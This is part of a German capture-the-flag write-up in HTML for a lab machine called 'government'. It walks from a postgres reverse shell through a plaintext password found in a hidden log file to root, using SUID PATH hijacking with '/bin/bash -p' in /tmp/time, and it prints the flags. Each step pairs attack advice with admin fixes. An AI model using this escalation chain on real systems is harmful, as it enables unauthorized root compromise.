+             <p class="evaluation"><strong>Bewertung:</strong> Die Reverse Shell wurde erfolgreich aufgebaut! Der Angreifer hat nun eine Shell auf dem Zielsystem, die mit den Rechten des `postgres`-Benutzers läuft.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die erhaltene Shell stabilisieren (z.B. mit Python PTY-Trick), `whoami` und `id` ausführen, um die Benutzerrechte zu bestätigen, und mit der lokalen Enumeration für die Privilege Escalation beginnen.<br><strong>Empfehlung (Admin):</strong> Untersuchen, wie die Codeausführung möglich war (phpPgAdmin, schwaches Passwort, `COPY FROM PROGRAM`). Die Lücke schließen. System auf Anzeichen weiterer Kompromittierung überprüfen.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">postgres@government: <span class="command">cd /var/log</span></div>
+                     <div class="prompt">postgres@government:/var/log$ <span class="command">cat .creds.log</span></div>
+                     <pre>WARNING
+
+//This file contain sensitive informations!!
+
+
+/////////////////////////////////////////////////////////////
+<span class="password">244fff13bf3c5f471e0e6bf7900945936cf1354dfea15130</span>
+////////////////////////////////////////////////////////////
+key: <span class="password">Tr770f1NdMy1mP0sSibl3P4sSw0rD,7iK3Th4t!</span>
+////////////////////////////////////////////////////////////
+IV: <span class="password">5721370743022037</span>
+////////////////////////////////////////////////////////////
+
+
+#WARNING#
+
+cyberchief Decrypt:
+<span class="password">h4cK1sMyf4v0ri73G4m3</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> In der Reverse Shell als `postgres`-Benutzer wird in das Verzeichnis `/var/log` gewechselt und eine versteckte Datei namens `.creds.log` gefunden und ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein weiterer kritischer Fund! Diese Log-Datei enthält extrem sensible Informationen:
+                 *   Einen langen hexadezimalen String (möglicherweise ein verschlüsseltes Passwort oder Daten).
+                 *   Einen Klartext-Schlüssel (`key: Tr770f...`).
+                 *   Einen Initialisierungsvektor (`IV: 5721...`).
+                 *   Einen Hinweis `cyberchief Decrypt:` gefolgt von einem Klartext-String: `<span class="password">h4cK1sMyf4v0ri73G4m3</span>`.
+             Es scheint, als sei der String `h4cK1sMyf4v0ri73G4m3` das Ergebnis der Entschlüsselung der Hex-Zeichenkette mit dem gegebenen Schlüssel und IV, oder es handelt sich um ein separates, wichtiges Passwort. Die Bezeichnung "cyberchief" könnte auf einen Benutzer oder eine Rolle hindeuten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der String `<span class="password">h4cK1sMyf4v0ri73G4m3</span>` sollte als potenzielles Passwort für privilegierte Benutzer (z.B. `root` oder andere im System gefundene Benutzer wie `erik`) getestet werden. Der Befehl `su` oder `sudo` könnte hier nützlich sein. Die anderen Informationen (Hex-String, Key, IV) könnten für die Entschlüsselung weiterer Daten relevant sein.<br><strong>Empfehlung (Admin):</strong> Sensible Daten wie Schlüssel, IVs oder Passwörter dürfen NIEMALS in Klartext-Logdateien gespeichert werden, schon gar nicht in allgemein lesbaren Verzeichnissen wie `/var/log`. Die Berechtigungen für Log-Dateien sollten restriktiv sein. Die Quelle dieser Log-Datei muss gefunden und der Prozess, der sie erstellt, korrigiert werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">postgres@government:/var/log$ <span class="command">su -l erik</span></div>
+                     <pre>Password: <span class="password">[Passwort hier eingegeben: h4cK1sMyf4v0ri73G4m3]</span></pre>
+                     <div class="prompt">erik@government:~$</div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `su -l erik` wird ausgeführt, um zum Benutzerkonto `erik` zu wechseln (`-l` simuliert einen vollständigen Login). Das zuvor in `.creds.log` gefundene Passwort `<span class="password">h4cK1sMyf4v0ri73G4m3</span>` wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Wechsel war erfolgreich! Der Angreifer hat nun eine Shell als Benutzer `erik`. Dies ist ein wichtiger Schritt in der Privilege Escalation, da `erik` möglicherweise mehr Rechte oder Zugriff auf andere Mechanismen hat als `postgres`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nun als `erik` weiter enumerieren: `sudo -l` prüfen, Home-Verzeichnis untersuchen, SUID/GUID-Dateien suchen, Cronjobs prüfen etc.<br><strong>Empfehlung (Admin):</strong> Das Passwort für den Benutzer `erik` sofort ändern. Überprüfen, warum `postgres` `su` zu `erik` ausführen konnte und ob dies beabsichtigt ist. Sicherstellen, dass Passwörter nicht wiederverwendet oder an unsicheren Orten gespeichert werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">erik@government:~$ <span class="command">find / -perm -u=s 2>/dev/null</span></div>
+                     <pre>/bin/umount
+/bin/ping
+/bin/mount
+/bin/su
+/sbin/mount.nfs
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/sbin/exim4
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+<span class="command">/home/erik/backups/nuclear/remove</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `find / -perm -u=s 2>/dev/null` sucht im gesamten Dateisystem (`/`) nach Dateien, bei denen das SUID-Bit gesetzt ist (`-perm -u=s`). Das SUID-Bit bewirkt, dass das Programm immer mit den Rechten des Dateieigentümers ausgeführt wird, unabhängig davon, wer es startet. Fehler (`stderr`) werden nach `/dev/null` umgeleitet, um die Ausgabe sauber zu halten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Neben vielen Standard-SUID-Binaries (wie `su`, `sudo`, `passwd`) wird eine ungewöhnliche Datei gefunden: `/home/erik/backups/nuclear/remove`. Eine SUID-Datei im Home-Verzeichnis eines Benutzers ist höchst verdächtig und oft ein Hinweis auf eine Fehlkonfiguration oder einen absichtlich platzierten Vektor für Privilege Escalation. Da die Datei `erik` gehört (oder root, aber in `erik`s Verzeichnis liegt) und SUID gesetzt ist (wahrscheinlich auf root), ist dies ein primäres Ziel für die weitere Untersuchung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datei `/home/erik/backups/nuclear/remove` genau untersuchen:
+                 *   Dateityp prüfen (`file /home/erik/backups/nuclear/remove`).
+                 *   Mit `strings` nach interessanten Zeichenketten suchen.
+                 *   Versuchen, sie auszuführen und das Verhalten beobachten.
+                 *   Wenn möglich, dekompilieren oder mit Debuggern (wie `gdb`, `strace`, `ltrace`) analysieren.
+                 <br><strong>Empfehlung (Admin):</strong> Überprüfen, warum die Datei `/home/erik/backups/nuclear/remove` SUID-Rechte hat. Wenn dies nicht absolut notwendig ist, das SUID-Bit entfernen (`chmod u-s /home/erik/backups/nuclear/remove`). Generell sollten SUID-Binaries auf ein Minimum beschränkt und regelmäßig überprüft werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">erik@government:~$ <span class="command">strings /home/erik/backups/nuclear/remove</span></div>
+                     <pre>/lib64/ld-linux-x86-64.so.2
+libc.so.6
+puts
+memset
+strcat
+system
+__cxa_finalize
+__libc_start_main
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_Jv_RegisterClasses
+_ITM_registerTMCloneTable
+GLIBC_2.2.5
+=q	 
+5j	 
+=!	 
+<span class="password">time ./ <<<<-----------<<< exploit it >>>><<<<<<<</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `strings` wird auf die verdächtige SUID-Datei angewendet, um lesbare Zeichenketten aus der Binärdatei zu extrahieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt neben Standard-Bibliotheksfunktionen und Symbolen eine sehr interessante Zeile: `time ./ <<<<-----------<<< exploit it >>>><<<<<<<<`. Dies deutet stark darauf hin, dass das Programm `remove` intern den Befehl `time` ohne Angabe eines vollständigen Pfades aufruft (nur `time` statt `/usr/bin/time`). Der Kommentar "exploit it" ist ein direkter Hinweis.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist eine klassische Path-Hijacking-Schwachstelle. Da das Programm `remove` mit Root-Rechten läuft (wegen SUID) und `time` ohne Pfadangabe aufruft, sucht es nach `time` in den Verzeichnissen, die in der `PATH`-Umgebungsvariable des aufrufenden Benutzers (`erik`) definiert sind. Wir können dies ausnutzen:
+                 1.  Erstelle ein eigenes Skript namens `time` in einem beschreibbaren Verzeichnis (z.B. `/tmp`).
+                 2.  In dieses Skript schreiben wir den Befehl, der als root ausgeführt werden soll (z.B. `/bin/bash -p`, um eine Root-Shell zu erhalten).
+                 3.  Mache das Skript ausführbar (`chmod +x /tmp/time`).
+                 4.  Füge das Verzeichnis `/tmp` am Anfang der `PATH`-Variable hinzu (`export PATH=/tmp:$PATH`).
+                 5.  Führe `/home/erik/backups/nuclear/remove` aus. Das Programm wird nun unser bösartiges `/tmp/time`-Skript anstelle des echten `/usr/bin/time` finden und mit Root-Rechten ausführen.
+                 <br><strong>Empfehlung (Admin):</strong> Programme (insbesondere SUID-Programme) sollten externe Befehle immer mit ihrem vollständigen Pfad aufrufen (z.B. `/usr/bin/time` statt `time`), um Path-Hijacking zu verhindern. Die Berechtigungen von SUID-Dateien überprüfen und minimieren.</p>
+
+            <h2 id="proof-of-concept">Proof of Concept (Privilege Escalation via SUID Path Hijacking)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Die folgenden Schritte demonstrieren die Ausnutzung der SUID-Binary `/home/erik/backups/nuclear/remove`, die den Befehl `time` ohne vollständigen Pfad aufruft. Durch Manipulation der `PATH`-Umgebungsvariable wird ein bösartiges Skript anstelle des legitimen `time`-Befehls ausgeführt, was zur Eskalation auf Root-Rechte führt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">erik@government:~$ <span class="command">echo '/bin/bash -p' > /tmp/time</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">erik@government:~$ <span class="command">chmod +x /tmp/time</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">erik@government:~$ <span class="command">export PATH=/tmp:$PATH</span></div>
+                     <!-- Kein Output -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong>
+                 1.  `echo '/bin/bash -p' > /tmp/time`: Erstellt eine Datei namens `time` im Verzeichnis `/tmp`. Der Inhalt dieser Datei ist der String `/bin/bash -p`. Die Option `-p` sorgt dafür, dass Bash versucht, die effektive UID (in diesem Fall root, wegen SUID) beizubehalten und nicht zur realen UID (erik) zurückzufallen.
+                 2.  `chmod +x /tmp/time`: Macht die erstellte Datei ausführbar.
+                 3.  `export PATH=/tmp:$PATH`: Fügt das Verzeichnis `/tmp` an den Anfang der `PATH`-Umgebungsvariable hinzu. Wenn nun ein Befehl ohne Pfadangabe ausgeführt wird, sucht das System zuerst in `/tmp` nach der ausführbaren Datei.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Vorbereitung für den Path-Hijacking-Angriff ist abgeschlossen. Eine bösartige `time`-Datei existiert in `/tmp` und wird vom System vor der echten `/usr/bin/time` gefunden werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist die Ausführung der SUID-Datei `/home/erik/backups/nuclear/remove`. Sie wird versuchen, `time` auszuführen, findet unser Skript in `/tmp` und führt `/bin/bash -p` mit Root-Rechten aus.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zum Aufruf externer Befehle mit vollem Pfad in (SUID-)Programmen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">erik@government:~$ <span class="command">./remove anything_because_it_expects_an_argument</span></div>
+                     <pre>-su: ./remove: No such file or directory</pre>
+                     <div class="prompt">erik@government:~$ <span class="command">cd /tmp</span></div>
+                     <!-- Kein Output -->
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, das Programm `remove` aus dem aktuellen Verzeichnis (`erik`s Home) auszuführen. Dies schlägt fehl (`No such file or directory`), da sich das Programm nicht dort befindet. Der Pentester wechselt daraufhin ins `/tmp`-Verzeichnis.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein kleiner Navigationsfehler. Das Programm muss mit seinem vollständigen Pfad aufgerufen werden, oder man muss sich im richtigen Verzeichnis befinden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> In das richtige Verzeichnis wechseln (`cd /home/erik/backups/nuclear`) oder das Programm mit vollem Pfad aufrufen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">erik@government:/tmp$ <span class="command">cd /home/erik/backups/nuclear</span></div>
+                     <div class="prompt">erik@government:~/backups/nuclear$ <span class="command">./remove test</span></div>
+                     <div class="prompt">bash-4.4# <span class="command">id</span></div>
+                     <pre><span class="command">uid=1000(erik) gid=1000(erik) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),1000(erik)</span></pre>
+                     <div class="prompt">bash-4.4#</div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong>
+                 1.  Der Benutzer wechselt in das korrekte Verzeichnis `/home/erik/backups/nuclear`.
+                 2.  Das SUID-Programm `./remove` wird ausgeführt (mit einem beliebigen Argument "test", da `strings` andeutete, dass es ein Argument erwartet oder zumindest verarbeitet).
+                 3.  Da `/tmp` am Anfang des `PATH` steht, führt `./remove` unser Skript `/tmp/time` aus, welches `/bin/bash -p` startet.
+                 4.  Der Prompt ändert sich zu `bash-4.4#`, was oft ein Indikator für eine Root-Shell ist.
+                 5.  Der Befehl `id` bestätigt dies: Die effektive User ID (`euid`) und effektive Group ID (`egid`) sind 0, was `root` entspricht.</p>
+             <p class="evaluation">**Bewertung:** Grandios! Die Privilege Escalation war erfolgreich. Durch Ausnutzung der Path-Hijacking-Schwachstelle in der SUID-Binary `remove` wurde eine Shell mit Root-Rechten erlangt. Das Ziel ist vollständig kompromittiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Root-Shell nutzen, um die Root-Flagge auszulesen (`cat /root/root.txt`). Weitere Post-Exploitation-Aktivitäten durchführen (Persistenz, weitere Datensuche, etc.).<br><strong>Empfehlung (Admin):</strong> Sofort die SUID-Berechtigung von `/home/erik/backups/nuclear/remove` entfernen (`chmod u-s`). Das Programm selbst korrigieren oder löschen. Das System auf weitere Kompromittierungen untersuchen und bereinigen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">bash-4.4# <span class="command">cd /root</span></div>
+                     <div class="prompt">bash-4.4# <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt">bash-4.4# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">df2f7ef853a5b36c51509a6f6ae2e7b1</span></pre>
+                     <div class="prompt">bash-4.4# <span class="command">cd /home/erik</span></div>
+                     <div class="prompt">bash-4.4# <span class="command">ls</span></div>
+                     <pre>backups  user.txt</pre>
+                     <div class="prompt">bash-4.4# <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">349efd4b1ccbeb4d3ca0108fa5cc5802</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> In der erhaltenen Root-Shell werden die Root-Flagge (`/root/root.txt`) und die User-Flagge (`/home/erik/user.txt`) ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Beide Flaggen wurden erfolgreich gefunden und bestätigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flags notieren, Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Nach der Bereinigung sicherstellen, dass Flags oder sensible Testdaten entfernt werden.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/erik/user.txt</div>
+                    <div class="flag-value"><span class="password">349efd4b1ccbeb4d3ca0108fa5cc5802</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">df2f7ef853a5b36c51509a6f6ae2e7b1</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan übernommen -->
+        <p>Berichtsdatum: 11. Oktober 2022</p>
+    </footer>
+</body>
+</html>
